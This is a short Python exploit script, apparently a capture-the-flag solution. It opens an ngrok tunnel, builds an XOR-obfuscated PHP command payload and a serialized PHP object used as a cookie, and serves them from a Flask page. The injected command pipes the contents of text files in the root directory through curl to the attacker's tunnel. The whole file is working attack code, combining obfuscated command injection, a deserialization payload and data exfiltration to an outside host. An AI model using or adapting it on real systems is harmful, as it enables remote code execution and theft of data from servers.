from flask import Flask, render_template
from multiprocessing import Process
from pyngrok import ngrok
from urllib.parse import quote
from subprocess import check_output

URL = "http://localhost:8080/"
PPORT = 4444
TUNNEL = ngrok.connect(PPORT, "tcp").public_url.replace("tcp://", "http://")

class WebServer:
    def __init__(self, cookie, xor_payload) -> None:
        self.app = Flask(__name__)
        self.cookie = cookie
        self.xor_payload = xor_payload

    def serve(self, port: int):
        @self.app.get("/")
        def home():
            return render_template("index.html",
                cookie=quote(self.cookie),
                xor_payload=self.xor_payload
            )
        Process(target=self.app.run, args=('0.0.0.0', port)).start()

def gen_xor(chars):
    return check_output(['php', './gen.php', chars]).decode()

def serial_payload():
    return check_output(['php', './serialize.php']).decode()

if __name__ == "__main__":
    xor_payload = gen_xor(f'curl "{TUNNEL}?$(cat /*.txt)"')
    serial = serial_payload()
    WebServer(cookie=serial, xor_payload=xor_payload).serve(PPORT)
    print(TUNNEL)
